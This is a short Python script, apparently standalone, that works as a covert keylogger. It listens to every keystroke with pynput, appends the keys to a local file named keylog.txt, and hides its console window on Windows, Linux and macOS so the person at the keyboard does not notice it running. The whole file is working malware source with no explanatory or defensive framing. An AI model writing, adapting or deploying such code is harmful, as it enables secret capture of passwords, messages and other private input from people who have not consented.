import pynput.keyboard
import sys

log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(str(key))

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop the program
        return False

# Hide the console window based on the operating system
def hide_console():
    if sys.platform == "win32":
        import win32gui, win32console
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
    elif sys.platform == "linux":
        import subprocess
        subprocess.Popen(["xdotool", "search", "--class", "console", "windowunmap"])
    elif sys.platform == "darwin":
        import subprocess
        subprocess.Popen(["osascript", "-e", 'tell app "Terminal" to set visible of front window to false'])

# Hide the console window
hide_console()

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()